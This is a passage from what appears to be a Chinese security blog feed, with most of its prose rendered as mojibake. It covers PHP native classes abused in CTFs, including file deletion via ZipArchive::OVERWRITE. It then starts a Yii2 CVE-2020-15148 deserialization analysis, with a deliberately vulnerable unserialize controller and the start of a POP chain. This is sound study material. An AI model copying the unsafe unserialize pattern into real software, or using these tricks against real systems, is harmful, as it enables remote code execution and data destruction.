punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">addPattern</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">close</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">count</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span>    <span class="token keyword">public</span> <span class="token function">deleteIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">deleteName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token function">extractTo</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$destination</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$entries</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getArchiveComment</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getCommentIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getCommentName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">GetExternalAttributesIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getExternalAttributesName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getFromIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getFromName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getNameIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getStatusString</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span>    <span class="token keyword">public</span> <span class="token function">getStream</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name">resource</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">isCompressionMethodSupported</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">isEncryptionMethodSupported</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">locateName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">open</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">int</span>    <span class="token keyword">public</span> <span class="token function">registerCancelCallback</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">registerProgressCallback</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">float</span> <span class="token variable">$rate</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">renameIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$new_name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">renameName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$new_name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">replaceFile</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filepath</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setArchiveComment</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCommentIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCommentName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCompressionIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$compflags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCompressionName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$compflags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setEncryptionIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setEncryptionName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setExternalAttributesIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setExternalAttributesName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setMtimeIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$timestamp</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">setMtimeName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$timestamp</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">setPassword</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$password</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">statIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">statName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">unchangeAll</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeArchive</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#125;</span></code></pre><p><strong>use</strong>ï¼š<code>ZipArchive::open ( string $filename [, int $flags ] ) : mixed</code></p><p><strong>flags</strong>ï¼šThe mode to use to open the archive.</p><ul><li><strong><code>ZipArchive::OVERWRITE</code></strong>ï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–ã€‚</li><li><strong><code>ZipArchive::CREATE</code></strong>ï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</li><li><strong><code>ZipArchive::RDONLY</code></strong>ï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚ <code>PHP&gt;7.4.3, PECL zip&gt;1.17.1</code></li><li><strong><code>ZipArchive::EXCL</code></strong>ï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚</li><li><strong><code>ZipArchive::CHECKCONS</code></strong>ï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚</li></ul><p><strong>Demo</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>ç›®å½•ä¸‹çš„<code>1.txt</code>å°†ä¼šè¢«åˆ é™¤</p><h3 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h3><p>æ³¨é‡Šè¯»å–</p><p><strong>range</strong>ï¼š<code>(PHP 5, PHP 7, PHP 8)</code></p><p>æ–¹æ³•å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/book.reflection.php">https://www.php.net/manual/zh/book.reflection.php</a></p><p><strong>Example Class</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Apple</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Orange'</span><span class="token punctuation">;</span>    <span class="token comment">/**     * This is DocComment     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Apple'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åˆ©ç”¨phpåå°„ç±»æ¥è¿›è¡Œæ“ä½œ</p><p><code>ReflectionMethod</code>ç»§æ‰¿<code>ReflectionFunctionAbstract</code>è¿™ä¸ªæŠ½è±¡ç±»ï¼Œè¿™ä¸ªæŠ½è±¡ç±»å®ç°<code>Reflector</code>æ¥å£</p><p><code>ReflectionFunctionAbstract</code>ä¸­æœ‰ä¸€ä¸ª<code>getDocComment</code>æ–¹æ³•ï¼Œç”¨ä»¥è·å–å‡½æ•°çš„æ³¨é‡Šæ–‡æœ¬ï¼Œæ³¨é‡Šæ–‡æœ¬éœ€ç¬¦åˆ<code>/**</code>å¼€å¤´çš„è§„èŒƒå¦åˆ™æ— æ³•è¯†åˆ«</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$ref</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Apple"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ref</span><span class="token operator">-></span><span class="token function">getDocComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"/**     * This is DocComment     */"</span></code></pre><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(å…¥é—¨ç¯‡)</a></li><li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">ååºåˆ—åŒ–ä¹‹PHPåŸç”Ÿç±»çš„åˆ©ç”¨</a></li><li><a href="https://www.anquanke.com/post/id/238482">PHP åŸç”Ÿç±»åœ¨ CTF ä¸­çš„åˆ©ç”¨</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> xxe </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> ssrf </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yii2ååºåˆ—åŒ–æ¼æ´(CVE-2020-15148)åˆ†æå­¦ä¹ </title>
      <link href="posts/c79847ee/"/>
      <url>posts/c79847ee/</url>
      
        <content type="html"><![CDATA[<h3 id="Yii2ä»‹ç»"><a href="#Yii2ä»‹ç»" class="headerlink" title="Yii2ä»‹ç»"></a>Yii2ä»‹ç»</h3><p>Yii æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ï¼ŒåŸºäºç»„ä»¶çš„ PHP æ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿå¼€å‘ç°ä»£ Web åº”ç”¨ç¨‹åºã€‚å³å¯ä»¥ç”¨äºå¼€å‘å„ç§ç”¨ PHP æ„å»ºçš„ Web åº”ç”¨ã€‚å› ä¸ºåŸºäºç»„ä»¶çš„æ¡†æ¶ç»“æ„å’Œè®¾è®¡ç²¾å·§çš„ç¼“å­˜æ”¯æŒï¼Œå®ƒç‰¹åˆ«é€‚åˆå¼€å‘å¤§å‹åº”ç”¨ï¼Œ å¦‚é—¨æˆ·ç½‘ç«™ã€ç¤¾åŒºã€å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ã€ ç”µå­å•†åŠ¡é¡¹ç›®å’Œ RESTful Web æœåŠ¡ç­‰ã€‚</p><h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><ul><li>Yii2 &lt; 2.0.38</li></ul><p>2.0.38å·²ä¿®å¤ï¼Œå®˜æ–¹ç»™<code>yii\db\BatchQueryResult</code>ç±»åŠ äº†ä¸€ä¸ª<code>__wakeup()</code>å‡½æ•°ï¼Œ<code>__wakeup</code>æ–¹æ³•åœ¨ç±»è¢«ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è¢«è°ƒç”¨ï¼Œè€Œè¿™é‡Œè¿™ä¹ˆå†™ï¼Œç›®çš„å°±æ˜¯åœ¨å½“BatchQueryResultç±»è¢«ååºåˆ—åŒ–æ—¶å°±ç›´æ¥æŠ¥é”™ï¼Œé¿å…ååºåˆ—åŒ–çš„å‘ç”Ÿï¼Œä¹Ÿå°±é¿å…äº†æ¼æ´ã€‚</p><ul><li><a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511165809784.png" alt loading="lazy"></p><h3 id="ç¯å¢ƒå¤ç°"><a href="#ç¯å¢ƒå¤ç°" class="headerlink" title="ç¯å¢ƒå¤ç°"></a>ç¯å¢ƒå¤ç°</h3><p>ç›´æ¥ä¸Š<code>github</code>å°†appä¸‹è½½ä¸‹æ¥è§£å‹</p><ul><li><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></li></ul><p>æœ¬åœ°webç¯å¢ƒä½¿ç”¨<code>phpstudy</code>é›†æˆç¯å¢ƒæ­å»ºï¼Œä½¿ç”¨<code>phpstorm</code>è¿›è¡Œ<code>xdebug</code>è°ƒè¯•</p><p>php versionï¼š7.4.3ntsï¼ŒApache versionï¼š2.4.39</p><p>ä¿®æ”¹<code>config\web.php</code>ä¸­çš„<code>cookieValidationKey</code>ä¸ºä»»æ„å€¼ï¼Œä½œä¸º<code>yii\web\Request::cookieValidationKey</code>çš„åŠ å¯†å€¼ï¼Œä¸è®¾ç½®ä¼šæŠ¥é”™</p><p>æ¥ç€è‡ªå·±æ·»åŠ ä¸€ä¸ª<code>controller</code>æ¥è¿›è¡Œæ¼æ´çš„åˆ©ç”¨ï¼Œåˆ›å»ºä¸€ä¸ªactionï¼š<a href="http://url/index.php?r=test/test">http://url/index.php?r=test/test</a>, controllersçš„å‘½åæ˜¯ï¼š <code>åç§°Controller</code>ï¼Œactionçš„å‘½åæ˜¯ï¼š <code>actionåç§°</code>ï¼Œå¦‚ä¸‹</p><p><code>controllers/TestController.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TestController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">actionTest</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å‘åŒ…æµ‹è¯•ï¼Œç¯å¢ƒæ­å»ºæˆåŠŸ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511191942698.png" alt loading="lazy"></p><h3 id="CVEæ¼æ´åˆ†æ"><a href="#CVEæ¼æ´åˆ†æ" class="headerlink" title="CVEæ¼æ´åˆ†æ"></a>CVEæ¼æ´åˆ†æ</h3><h4 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h4><p>ä»<code>yii\db\BatchQueryResult</code>è¿™ä¸ªç±»å…¥æ‰‹ï¼Œæèµ·ä¸»è¦ä»£ç åˆ†æï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// make sure cursor is closed</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span><span class="token operator">-></span><span class="token function">close</span><span class="token 